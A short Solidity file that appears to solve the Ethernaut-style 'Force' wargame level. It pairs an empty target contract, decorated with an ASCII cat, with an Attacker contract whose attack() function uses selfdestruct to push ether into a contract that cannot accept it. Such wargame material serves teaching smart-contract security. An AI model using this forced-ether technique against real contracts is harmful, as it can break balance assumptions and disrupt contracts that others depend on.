// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attacker {
    constructor () public payable {

    }

    function attack(address payable _victim) public {
        selfdestruct(_victim);
    }
}